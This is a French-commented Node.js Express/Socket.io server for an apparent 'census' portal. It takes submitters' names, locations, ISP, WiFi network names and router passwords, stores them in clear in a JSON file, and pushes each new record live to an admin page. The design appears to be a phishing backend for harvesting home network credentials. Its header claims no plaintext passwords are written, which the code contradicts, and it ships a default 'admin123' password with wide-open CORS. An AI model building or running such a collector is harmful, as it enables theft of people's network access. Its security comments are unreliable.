/**
 * Serveur Express + Socket.io — portail de recensement.
 *
 * Objectifs:
 * - Accès à l'espace habilité réservé à l'admin (login + cookie HttpOnly)
 * - Persistance des dossiers sur disque (JSON) pour ré-affichage après refresh
 *
 * Note sécurité: on n'écrit pas de mots de passe en clair sur disque.
 */
const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const path = require("path");
const fs = require("fs");
const crypto = require("crypto");

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: "*" },
});

const PORT = process.env.PORT || 3000;
const PUBLIC = path.join(__dirname, "public");
const DATA_DIR = path.join(__dirname, "data");
const DATA_FILE = path.join(DATA_DIR, "registrations.json");

const ADMIN_USER = process.env.ADMIN_USER || "admin";
const ADMIN_PASS = process.env.ADMIN_PASS || "admin123";

/** @type {Map<string, {user: string, createdAt: number}>} */
const adminTokens = new Map();

/** @type {Array<any>} */
let registrations = [];

function ensureDataFile() {
  if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR);
  if (!fs.existsSync(DATA_FILE)) fs.writeFileSync(DATA_FILE, "[]", "utf8");
}

function loadRegistrations() {
  try {
    ensureDataFile();
    const raw = fs.readFileSync(DATA_FILE, "utf8");
    const parsed = JSON.parse(raw);
    registrations = Array.isArray(parsed) ? parsed : [];
  } catch (e) {
    registrations = [];
  }
}

function saveRegistrations() {
  ensureDataFile();
  fs.writeFileSync(DATA_FILE, JSON.stringify(registrations, null, 2), "utf8");
}

function parseCookies(cookieHeader) {
  const out = {};
  if (!cookieHeader) return out;
  cookieHeader.split(";").forEach((part) => {
    const idx = part.indexOf("=");
    if (idx === -1) return;
    const k = part.slice(0, idx).trim();
    const v = part.slice(idx + 1).trim();
    out[k] = decodeURIComponent(v);
  });
  return out;
}

function isAdminRequest(req) {
  const cookies = parseCookies(req.headers.cookie || "");
  const token = cookies.admin_token;
  return token && adminTokens.has(token);
}

function requireAdmin(req, res, next) {
  if (!isAdminRequest(req)) {
    return res.status(302).set("Location", "/admin-login.html").end();
  }
  next();
}

loadRegistrations();

app.use(express.json());

// Pages: admin protégée, login public
app.get("/admin.html", requireAdmin, (req, res) => {
  res.sendFile(path.join(PUBLIC, "admin.html"));
});
app.get("/", (req, res) => res.sendFile(path.join(PUBLIC, "index.html")));

// Fichiers statiques (CSS/JS/images + pages non protégées)
app.use(express.static(PUBLIC, { index: false }));

// Auth admin
app.post("/api/admin/login", (req, res) => {
  const { username, password } = req.body || {};
  if (username !== ADMIN_USER || password !== ADMIN_PASS) {
    return res.status(401).json({ ok: false, message: "Identifiants invalides" });
  }
  const token = crypto.randomBytes(24).toString("hex");
  adminTokens.set(token, { user: username, createdAt: Date.now() });
  res
    .set(
      "Set-Cookie",
      `admin_token=${encodeURIComponent(token)}; HttpOnly; SameSite=Lax; Path=/`
    )
    .json({ ok: true });
});

app.post("/api/admin/logout", (req, res) => {
  const cookies = parseCookies(req.headers.cookie || "");
  const token = cookies.admin_token;
  if (token) adminTokens.delete(token);
  res
    .set("Set-Cookie", "admin_token=; Max-Age=0; Path=/; HttpOnly; SameSite=Lax")
    .json({ ok: true });
});

app.get("/api/admin/registrations", (req, res) => {
  if (!isAdminRequest(req)) return res.status(401).json({ ok: false });
  res.json({ ok: true, data: registrations });
});

// Endpoint REST (optionnel)
app.post("/api/recensement/register", (req, res) => {
  const payload = req.body || {};
  const record = normalizeRecord(payload);
  registrations.push(record);
  saveRegistrations();
  io.to("admins").emit("new-registration", record);
  res.json({ ok: true });
});

function normalizeRecord(data) {
  const boxPwd = data.boxPassword ?? "";
  return {
    ownerName: data.ownerName ?? "",
    region: data.region ?? "",
    city: data.city ?? "",
    network: data.network ?? "",
    wifiName: data.wifiName ?? "",
    // Les mots de passe sont mis en clair pour présentation
    boxPassword: boxPwd,
    submittedAt: new Date().toISOString(),
    id: crypto.randomUUID ? crypto.randomUUID() : String(Date.now() + Math.random()),
  };
}

// Socket.io : seul l'admin reçoit l'historique + les nouveaux dossiers
io.use((socket, next) => {
  const cookieHeader = socket.request.headers.cookie || "";
  const cookies = parseCookies(cookieHeader);
  const token = cookies.admin_token;
  socket.data.isAdmin = Boolean(token && adminTokens.has(token));
  next();
});

io.on("connection", (socket) => {
  if (socket.data.isAdmin) {
    socket.join("admins");
    socket.emit("bootstrap", registrations);
  }

  socket.on("register-data", (data) => {
    const record = normalizeRecord(data || {});
    registrations.push(record);
    saveRegistrations();
    io.to("admins").emit("new-registration", record);
  });
});

server.listen(PORT, () => {
  console.log(`Portail : http://localhost:${PORT}`);
  console.log(`Espace habilité : http://localhost:${PORT}/admin.html`);
  console.log(`Login admin : http://localhost:${PORT}/admin-login.html`);
});
